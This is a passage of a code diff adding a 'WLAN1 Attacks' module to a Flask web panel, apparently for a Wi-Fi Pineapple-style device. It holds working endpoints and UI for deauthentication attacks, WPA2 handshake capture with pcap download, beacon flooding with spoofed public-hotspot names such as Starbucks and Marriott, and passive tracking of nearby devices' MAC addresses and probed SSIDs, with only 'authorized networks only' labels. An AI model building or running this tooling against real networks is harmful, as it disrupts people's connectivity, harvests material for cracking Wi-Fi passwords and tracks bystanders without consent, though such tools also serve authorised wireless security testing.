+    except subprocess.TimeoutExpired:
+        return jsonify({'ok': False, 'error': 'timeout'})
+    except Exception as e:
+        return jsonify({'ok': False, 'error': str(e)})
+
+@app.route('/api/wlan1/handshake', methods=['POST'])
+@require_auth
+def api_handshake_start():
+    d = request.json or {}
+    bssid   = d.get('bssid','').strip()
+    channel = str(d.get('channel', 6))
+    client  = d.get('client','FF:FF:FF:FF:FF:FF').strip() or 'FF:FF:FF:FF:FF:FF'
+    if not bssid:
+        return jsonify({'ok': False, 'error': 'bssid required'})
+    job_id = uuid.uuid4().hex[:8]
+    pcap_path = f'{PCAP_DIR}/hs_{job_id}.pcap'
+    _hs_jobs[job_id] = {'status': 'running', 'output': '', 'pcap': None}
+
+    def run():
+        try:
+            r = subprocess.run(
+                ['python3', '/usr/local/bin/pinapple-handshake',
+                 bssid, channel, pcap_path, client],
+                capture_output=True, text=True, timeout=45)
+            output = r.stdout + r.stderr
+            if r.returncode == 0 and os.path.exists(pcap_path):
+                _hs_jobs[job_id] = {'status': 'success', 'output': output,
+                                    'pcap': f'hs_{job_id}.pcap'}
+            else:
+                _hs_jobs[job_id] = {'status': 'failed', 'output': output, 'pcap':
+                                    f'hs_{job_id}.pcap' if os.path.exists(pcap_path) else None}
+        except subprocess.TimeoutExpired:
+            _hs_jobs[job_id] = {'status': 'timeout', 'output': 'Timed out after 45s', 'pcap': None}
+        except Exception as e:
+            _hs_jobs[job_id] = {'status': 'error', 'output': str(e), 'pcap': None}
+
+    import threading
+    threading.Thread(target=run, daemon=True).start()
+    return jsonify({'ok': True, 'job_id': job_id})
+
+@app.route('/api/wlan1/handshake/<job_id>')
+@require_auth
+def api_handshake_status(job_id):
+    job = _hs_jobs.get(job_id)
+    if not job:
+        return jsonify({'ok': False, 'error': 'unknown job'})
+    return jsonify({'ok': True, **job})
+
+@app.route('/api/wlan1/beacon-flood/start', methods=['POST'])
+@require_auth
+def api_beacon_start():
+    d = request.json or {}
+    ssids = d.get('ssids', [])
+    if not ssids:
+        return jsonify({'ok': False, 'error': 'ssids list required'})
+    # Stop existing
+    if _beacon_proc[0] and _beacon_proc[0].poll() is None:
+        _beacon_proc[0].terminate()
+    # Write ssids file
+    with open(BEACON_SSIDS, 'w') as f:
+        f.write('\n'.join(ssids[:50]))
+    proc = subprocess.Popen(
+        ['python3', '/usr/local/bin/pinapple-beacon-flood', BEACON_SSIDS, 'wlan1'],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    _beacon_proc[0] = proc
+    with open(BEACON_PID, 'w') as f:
+        f.write(str(proc.pid))
+    return jsonify({'ok': True, 'pid': proc.pid, 'ssid_count': len(ssids)})
+
+@app.route('/api/wlan1/beacon-flood/stop', methods=['POST'])
+@require_auth
+def api_beacon_stop():
+    stopped = False
+    if _beacon_proc[0] and _beacon_proc[0].poll() is None:
+        _beacon_proc[0].terminate()
+        stopped = True
+    try:
+        with open(BEACON_PID) as f:
+            pid = int(f.read().strip())
+        os.kill(pid, 15)
+        stopped = True
+    except:
+        pass
+    try: os.remove(BEACON_PID)
+    except: pass
+    return jsonify({'ok': True, 'stopped': stopped})
+
+@app.route('/api/wlan1/beacon-flood/status')
+@require_auth
+def api_beacon_status():
+    running = False
+    pid = None
+    if _beacon_proc[0] and _beacon_proc[0].poll() is None:
+        running = True
+        pid = _beacon_proc[0].pid
+    else:
+        try:
+            with open(BEACON_PID) as f:
+                pid = int(f.read().strip())
+            os.kill(pid, 0)
+            running = True
+        except:
+            pass
+    ssids = []
+    try:
+        with open(BEACON_SSIDS) as f:
+            ssids = [l.strip() for l in f if l.strip()]
+    except:
+        pass
+    return jsonify({'running': running, 'pid': pid, 'ssids': ssids})
+
+@app.route('/api/wlan1/pcap/<filename>')
+@require_auth
+def api_pcap_download(filename):
+    # Security: only allow hs_*.pcap filenames
+    import re
+    if not re.match(r'^hs_[a-f0-9]{8}\.pcap$', filename):
+        return Response('Invalid filename', 403)
+    fpath = os.path.join(PCAP_DIR, filename)
+    if not os.path.exists(fpath):
+        return Response('Not found', 404)
+    with open(fpath, 'rb') as f:
+        data = f.read()
+    return Response(data, mimetype='application/octet-stream',
+                   headers={'Content-Disposition': f'attachment; filename={filename}'})
+
+# ---- WLAN1 PAGE ----
+
+@app.route('/wlan1')
+@require_auth
+def wlan1_page():
+    probes  = get_probes()
+    tracker = get_tracker()
+    networks = get_recon()
+
+    # Build network options for deauth dropdown
+    net_opts = '<option value="">-- manual entry --</option>' + \
+        ''.join('<option value="{b}">{s} ({b})</option>'.format(
+            b=n.get('bssid',''), s=n.get('ssid','?') or n.get('bssid',''))
+            for n in sorted(networks, key=lambda x: x.get('signal',0), reverse=True)
+            if n.get('bssid'))
+
+    # Probe table rows
+    probe_rows = ''.join(
+        '<tr><td><code style="font-size:0.75rem">{mac}</code></td>'
+        '<td><strong>{ssid}</strong></td>'
+        '<td style="font-size:0.75rem;color:var(--dim)">{first}</td>'
+        '<td style="font-size:0.75rem;color:var(--dim)">{last}</td>'
+        '<td style="text-align:center">{cnt}</td></tr>'.format(
+            mac=p.get('mac',''), ssid=p.get('ssid',''),
+            first=p.get('first_seen',''), last=p.get('last_seen',''),
+            cnt=p.get('count',1))
+        for p in sorted(probes, key=lambda x: x.get('last_seen',''), reverse=True)
+    ) or '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No probes captured yet — scanning wlan1...</td></tr>'
+
+    # Tracker table rows
+    def pt_badges(pt_dict):
+        colors = {'probe-req':'bb','beacon':'bg','data':'bw','deauth':'br','mgmt':'','assoc-req':'bb'}
+        return ' '.join('<span class="badge {}">{}</span>'.format(
+            colors.get(k,''), k) for k,v in sorted(pt_dict.items(), key=lambda x: -x[1])[:4])
+
+    tracker_rows = ''.join(
+        '<tr><td><code style="font-size:0.75rem">{mac}</code></td>'
+        '<td style="font-size:0.75rem;color:var(--dim)">{first}</td>'
+        '<td style="font-size:0.75rem;color:var(--dim)">{last}</td>'
+        '<td>{types}</td>'
+        '<td style="font-size:0.75rem;color:var(--acc)">{ssids}</td>'
+        '<td style="text-align:center">{cnt}</td></tr>'.format(
+            mac=t.get('mac',''),
+            first=t.get('first_seen',''), last=t.get('last_seen',''),
+            types=pt_badges(t.get('packet_types',{})),
+            ssids=', '.join(t.get('ssids',[])[:3]),
+            cnt=t.get('count',0))
+        for t in tracker[:100]
+    ) or '<tr><td colspan="6" style="text-align:center;color:var(--dim)">No devices seen yet — monitoring wlan1...</td></tr>'
+
+    content = """
+<div style="margin-bottom:16px;display:flex;gap:8px;border-bottom:1px solid var(--bdr);padding-bottom:12px">
+  <button class="btn btn-outline" onclick="showTab('probes')" id="tab-probes">&#128246; Probe Requests ({np})</button>
+  <button class="btn btn-outline" onclick="showTab('deauth')" id="tab-deauth">&#9889; Deauth</button>
+  <button class="btn btn-outline" onclick="showTab('handshake')" id="tab-handshake">&#128握; Handshake Capture</button>
+  <button class="btn btn-outline" onclick="showTab('beacon')" id="tab-beacon">&#128225; Beacon Flood</button>
+  <button class="btn btn-outline" onclick="showTab('tracker')" id="tab-tracker">&#128202; Client Tracker ({nt})</button>
+</div>
+
+<!-- PROBES TAB -->
+<div id="pane-probes" class="tab-pane">
+  <div class="sh"><span class="st">Probe Requests — Devices searching for SSIDs</span>
+    <span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 5s</span></div>
+  <div class="twrap"><table>
+    <thead><tr><th>Device MAC</th><th>SSID Searching For</th><th>First Seen</th><th>Last Seen</th><th>Count</th></tr></thead>
+    <tbody id="probe-tbody">{probe_rows}</tbody>
+  </table></div>
+</div>
+
+<!-- DEAUTH TAB -->
+<div id="pane-deauth" class="tab-pane" style="display:none">
+  <div class="sh"><span class="st">Deauthentication Attack</span>
+    <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
+  <div class="card" style="max-width:600px">
+    <div class="fr">
+      <div class="fg">
+        <label>Target AP (BSSID)</label>
+        <select id="da-net-sel" onchange="fillBssid(this.value)" style="background:var(--bg);border:1px solid var(--bdr);color:var(--txt);padding:10px 14px;border-radius:8px;font-size:0.875rem">
+          {net_opts}
+        </select>
+      </div>
+      <div class="fg">
+        <label>AP BSSID (manual)</label>
+        <input id="da-bssid" placeholder="AA:BB:CC:DD:EE:FF" style="text-transform:uppercase">
+      </div>
+    </div>
+    <div class="fr">
+      <div class="fg">
+        <label>Client MAC (FF:FF:FF:FF:FF:FF = broadcast)</label>
+        <input id="da-client" value="FF:FF:FF:FF:FF:FF" style="text-transform:uppercase">
+      </div>
+      <div class="fg">
+        <label>Burst Count: <span id="da-count-label">64</span></label>
+        <input type="range" id="da-count" min="10" max="500" value="64"
+               oninput="document.getElementById('da-count-label').textContent=this.value"
+               style="width:100%;margin-top:8px">
+      </div>
+    </div>
+    <button class="btn btn-danger" onclick="fireDeauth()">&#9889; Send Deauth</button>
+    <div id="da-output" style="margin-top:12px;font-family:monospace;font-size:0.8rem;color:var(--acc);white-space:pre-wrap"></div>
+  </div>
+</div>
+
+<!-- HANDSHAKE TAB -->
+<div id="pane-handshake" class="tab-pane" style="display:none">
+  <div class="sh"><span class="st">WPA2 Handshake Capture</span>
+    <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
+  <div class="card" style="max-width:600px">
+    <div class="fr">
+      <div class="fg">
+        <label>Target AP (from recon)</label>
+        <select id="hs-net-sel" onchange="fillHsBssid(this.value)" style="background:var(--bg);border:1px solid var(--bdr);color:var(--txt);padding:10px 14px;border-radius:8px;font-size:0.875rem">
+          {net_opts2}
+        </select>
+      </div>
+      <div class="fg">
+        <label>BSSID</label>
+        <input id="hs-bssid" placeholder="AA:BB:CC:DD:EE:FF" style="text-transform:uppercase">
+      </div>
+    </div>
+    <div class="fr">
+      <div class="fg">
+        <label>Channel</label>
+        <input id="hs-channel" type="number" value="6" min="1" max="13">
+      </div>
+      <div class="fg">
+        <label>Client MAC (optional, FF:FF:FF:FF:FF:FF = broadcast)</label>
+        <input id="hs-client" value="FF:FF:FF:FF:FF:FF" style="text-transform:uppercase">
+      </div>
+    </div>
+    <button class="btn btn-accent" onclick="startHandshake()" id="hs-btn">&#128握; Start Capture</button>
+    <div id="hs-status" style="margin-top:16px;padding:12px;background:var(--bg);border-radius:8px;font-family:monospace;font-size:0.8rem;display:none"></div>
+  </div>
+</div>
+
+<!-- BEACON FLOOD TAB -->
+<div id="pane-beacon" class="tab-pane" style="display:none">
+  <div class="sh"><span class="st">Beacon Flood</span>
+    <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized lab use only</span></div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+  <div class="card">
+    <div class="card-title">SSID List (one per line, max 50)</div>
+    <textarea id="bf-ssids" rows="12"
+      style="width:100%;background:var(--bg);border:1px solid var(--bdr);color:var(--txt);
+             padding:10px;border-radius:8px;font-size:0.8rem;font-family:monospace;margin-top:8px;resize:vertical"
+      placeholder="Free WiFi&#10;Starbucks WiFi&#10;xfinitywifi&#10;Hotel Guest&#10;ATT Wi-Fi">Free WiFi
+Starbucks WiFi
+xfinitywifi
+Hotel Guest WiFi
+ATT Wi-Fi
+CableWiFi
+XFINITY
+TWC WiFi Passpoint
+Airport Free WiFi
+_The Coffee Bean_
+hhonors
+Marriott_GUEST
+Boingo Hotspot
+Google Starbucks
+optimumwifi</textarea>
+    <div style="display:flex;gap:8px;margin-top:12px">
+      <button class="btn btn-danger" onclick="startFlood()" id="bf-start">&#128225; Start Flood</button>
+      <button class="btn btn-outline" onclick="stopFlood()" id="bf-stop">&#9632; Stop</button>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">Status</div>
+    <div id="bf-status" style="margin-top:8px;font-size:0.85rem;color:var(--dim)">Idle</div>
+    <div id="bf-active-ssids" style="margin-top:12px"></div>
+  </div>
+  </div>
+</div>
+
+<!-- TRACKER TAB -->
+<div id="pane-tracker" class="tab-pane" style="display:none">
+  <div class="sh"><span class="st">All Devices Seen on wlan1 ({nt} total)</span>
+    <span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 10s</span></div>
+  <div class="twrap"><table>
+    <thead><tr><th>MAC Address</th><th>First Seen</th><th>Last Seen</th><th>Packet Types</th><th>Probed SSIDs</th><th>Pkts</th></tr></thead>
+    <tbody id="tracker-tbody">{tracker_rows}</tbody>
+  </table></div>
+</div>
+""".format(
+        np=len(probes), nt=len(tracker),
+        probe_rows=probe_rows, tracker_rows=tracker_rows,
+        net_opts=net_opts, net_opts2=net_opts,
+    )
+
+    js = r"""<script>
+function showTab(name) {
+  document.querySelectorAll('.tab-pane').forEach(p => p.style.display='none');
+  document.getElementById('pane-'+name).style.display='';
+  document.querySelectorAll('.tab-pane ~ * button, [id^="tab-"]').forEach(b => b.classList.remove('btn-acc'));
+  const btn = document.getElementById('tab-'+name);
+  if (btn) { btn.classList.remove('btn-outline'); btn.classList.add('btn-acc'); }
+}
+showTab('probes');
+
+function fillBssid(v) { if(v) document.getElementById('da-bssid').value=v; }
+function fillHsBssid(v) {
+  if (!v) return;
+  document.getElementById('hs-bssid').value = v;
+  // try to fill channel from recon data
+}
+
+async function fireDeauth() {
+  const bssid = document.getElementById('da-bssid').value.trim();
+  const client = document.getElementById('da-client').value.trim() || 'FF:FF:FF:FF:FF:FF';
+  const count = parseInt(document.getElementById('da-count').value);
+  if (!bssid) { alert('Enter a BSSID'); return; }
+  const out = document.getElementById('da-output');
+  out.textContent = 'Sending...';
+  const r = await api('/api/wlan1/deauth', 'POST', {bssid, client, count});
+  out.textContent = r.output || (r.error || 'Error');
+  out.style.color = r.ok ? 'var(--grn)' : 'var(--red)';
+}
+
+let hsJobId = null;
+let hsPoll = null;
+
+async function startHandshake() {
+  const bssid = document.getElementById('hs-bssid').value.trim();
+  const channel = document.getElementById('hs-channel').value;
+  const client = document.getElementById('hs-client').value.trim() || 'FF:FF:FF:FF:FF:FF';
+  if (!bssid) { alert('Enter a BSSID'); return; }
+  document.getElementById('hs-btn').textContent = 'Running...';
+  document.getElementById('hs-btn').disabled = true;
+  const st = document.getElementById('hs-status');
+  st.style.display = '';
+  st.style.color = 'var(--txt)';
+  st.textContent = '[*] Starting capture on ' + bssid + ' ch' + channel + '...\n';
+  const r = await api('/api/wlan1/handshake', 'POST', {bssid, channel, client});
+  if (!r.ok) { st.textContent = 'Error: ' + r.error; return; }
+  hsJobId = r.job_id;
+  hsPoll = setInterval(async () => {
+    const s = await api('/api/wlan1/handshake/' + hsJobId, 'GET');
+    st.textContent = s.output || '';
+    if (s.status !== 'running') {
+      clearInterval(hsPoll);
+      document.getElementById('hs-btn').textContent = 'Start Capture';
+      document.getElementById('hs-btn').disabled = false;
+      if (s.status === 'success' && s.pcap) {
+        st.textContent += '\n[+] HANDSHAKE CAPTURED!\n';
+        st.style.color = 'var(--grn)';
+        const dl = document.createElement('a');
+        dl.href = '/api/wlan1/pcap/' + s.pcap;
+        dl.textContent = 'Download ' + s.pcap;
+        dl.className = 'btn btn-acc';
+        dl.style.marginTop = '8px';
+        dl.style.display = 'inline-flex';
+        st.after(dl);
+      } else {
+        st.style.color = 'var(--warn)';
+      }
+    }
+  }, 2000);
+}
+
+async function startFlood() {
+  const raw = document.getElementById('bf-ssids').value;
+  const ssids = raw.split('\n').map(s=>s.trim()).filter(Boolean);
+  if (!ssids.length) { alert('Enter at least one SSID'); return; }
+  const r = await api('/api/wlan1/beacon-flood/start', 'POST', {ssids});
+  const st = document.getElementById('bf-status');
+  if (r.ok) {
+    st.textContent = 'Flooding ' + r.ssid_count + ' SSIDs (PID ' + r.pid + ')';
+    st.style.color = 'var(--red)';
+  } else {
+    st.textContent = 'Error: ' + r.error;
+  }
+  updateBeaconStatus();
+}
+
+async function stopFlood() {
+  const r = await api('/api/wlan1/beacon-flood/stop', 'POST');
+  document.getElementById('bf-status').textContent = 'Stopped.';
+  document.getElementById('bf-status').style.color = 'var(--dim)';
+  document.getElementById('bf-active-ssids').innerHTML = '';
+}
+
+async function updateBeaconStatus() {
+  const r = await fetch('/api/wlan1/beacon-flood/status');
+  const d = await r.json();
+  const st = document.getElementById('bf-status');
+  if (d.running) {
+    st.textContent = 'ACTIVE — flooding ' + (d.ssids||[]).length + ' SSIDs (PID ' + d.pid + ')';
+    st.style.color = 'var(--red)';
+    document.getElementById('bf-active-ssids').innerHTML =
+      '<div style="font-size:0.75rem;color:var(--dim);margin-top:4px">' +
+      (d.ssids||[]).map(s=>'<span class="badge bb" style="margin:2px">'+s+'</span>').join(' ') + '</div>';
+  }
+}
+updateBeaconStatus();
+
+// Auto-refresh probes
+async function refreshProbes() {
+  const r = await fetch('/api/probes');
+  const data = await r.json();
+  const t = document.getElementById('probe-tbody');
+  if (!data.length) {
+    t.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No probes yet</td></tr>';
+    return;
+  }
+  t.innerHTML = data.map(p => '<tr><td><code style="font-size:0.75rem">'+p.mac+'</code></td><td><strong>'+p.ssid+'</strong></td><td style="font-size:0.75rem;color:var(--dim)">'+p.first_seen+'</td><td style="font-size:0.75rem;color:var(--dim)">'+p.last_seen+'</td><td style="text-align:center">'+p.count+'</td></tr>').join('');
+}
+setInterval(refreshProbes, 5000);
+
+// Auto-refresh tracker
+const ptColors = {'probe-req':'bb','beacon':'bg','data':'bw','deauth':'br','mgmt':''};
+async function refreshTracker() {
+  const r = await fetch('/api/tracker');
+  const data = await r.json();
+  const t = document.getElementById('tracker-tbody');
+  if (!data.length) {
+    t.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--dim)">No devices seen yet</td></tr>';
+    return;
+  }
+  t.innerHTML = data.slice(0,100).map(d => {
+    const types = Object.entries(d.packet_types||{}).sort((a,b)=>b[1]-a[1]).slice(0,4)
+      .map(([k])=>'<span class="badge '+(ptColors[k]||'')+'">'+k+'</span>').join(' ');
+    return '<tr><td><code style="font-size:0.75rem">'+d.mac+'</code></td><td style="font-size:0.75rem;color:var(--dim)">'+d.first_seen+'</td><td style="font-size:0.75rem;color:var(--dim)">'+d.last_seen+'</td><td>'+types+'</td><td style="font-size:0.75rem;color:var(--acc)">'+(d.ssids||[]).slice(0,3).join(', ')+'</td><td style="text-align:center">'+(d.count||0)+'</td></tr>';
+  }).join('');
+}
+setInterval(refreshTracker, 10000);
+</script>"""
+
+    return page('WLAN1 Attacks', content, 'wl', js)
+
+
+if __name__ == '__main__':
+    os.makedirs('/var/log/pinapple', exist_ok=True)
+    os.makedirs('/etc/pinapple', exist_ok=True)
+    app.run(host='0.0.0.0', port=8080, debug=False)
